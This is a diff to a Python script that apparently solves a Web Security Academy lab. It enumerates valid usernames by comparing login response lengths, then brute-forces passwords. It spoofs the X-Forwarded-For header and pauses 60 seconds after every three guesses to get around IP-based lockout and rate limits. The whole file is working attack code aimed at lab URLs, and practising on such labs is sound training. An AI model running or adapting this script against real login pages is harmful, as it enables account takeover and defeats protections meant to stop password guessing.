@@ -1,5 +1,5 @@
 import requests, signal, sys, re
-
+import time
 def read_file(file):
     content = []
 
@@ -24,8 +24,9 @@ def valid_username(url, usernames):
         for _ in range(5):
             response_user = requests.post(url=url,data={"username":username,"password":"blabla"})
             print("User: {}\tResponse length: {}".format(username,len(response_user.content)))
+            # print(response_user.content)
             # find current len below after some testing
-            if len(response_user._content) != 2994:
+            if len(response_user._content) != 3132:
                 valid_usernames.append(username)
                 print("\nValid Username: {}".format(','.join(valid_usernames)))
                 break
@@ -33,20 +34,39 @@ def valid_username(url, usernames):
     print(f"\n[*] All valid usernames: {', '.join(valid_usernames)}")
     return valid_usernames
 
-def valid_password(url, valid_usernames, passwords,patterns):
-
+def valid_password(url, valid_usernames, passwords, patterns):
     valid_password = dict.fromkeys(valid_usernames, '')
 
     for username in valid_usernames:
-        for password in passwords:
-            headers = {'X-Forwarded-For':str(int(passwords.index(password)+.0)+1)}
-            response_pass = requests.post(url=url,data={"username":username,"password":password},headers=headers)
-            print("Validating password: {}\tUser: {}\tResponse length: {}".format(password,username,len(response_pass.content)))
-            resp_clean = " ".join(re.sub(re.compile('<.*?>'), '', response_pass.text).split())
-            if (patterns[0] not in resp_clean and patterns[1] not in resp_clean):            
-                valid_password[username] = password
-                break
+        i = 0
+        while i < len(passwords):
+            found = False
+            for j in range(3):
+                idx = i + j
+                if idx >= len(passwords):
+                    break
+                password = passwords[idx]
+                headers = {'X-Forwarded-For': str(idx + 1)}
+                response_pass = requests.post(url=url, data={"username": username, "password": password}, headers=headers)
+
+                print("Validating password: {}\tUser: {}\tResponse length: {}".format(password, username, len(response_pass.content)))
+                resp_clean = " ".join(re.sub(re.compile('<.*?>'), '', response_pass.text).split())
+                print(resp_clean)
+
+                if (patterns[0] not in resp_clean and patterns[1] not in resp_clean):
+                    valid_password[username] = password
+                    found = True
+                    break  # 发现有效密码，跳出三次循环
+
+            if found:
+                break  
+
+            # try three different passwords, then wait 60 seconds
+            time.sleep(60)
+            i += 3  # to next three passwords
+
     return valid_password
+
 
 def def_handler(key,frame):
     print("\n[*] Exiting")
@@ -60,8 +80,8 @@ def main():
     patterns = []
     signal.signal(signal.SIGINT, def_handler)
 
-    url = "https://0a2000d5047f6b6680f8f3d200af008f.web-security-academy.net/"
-
+    url = "https://0ae2000b031016b080e8267300d700d3.web-security-academy.net/login"
+           
     print("\n[*] Validating usernames\n")
     usernames = read_file("./username.txt")
     valid_usernames = valid_username(url, usernames)
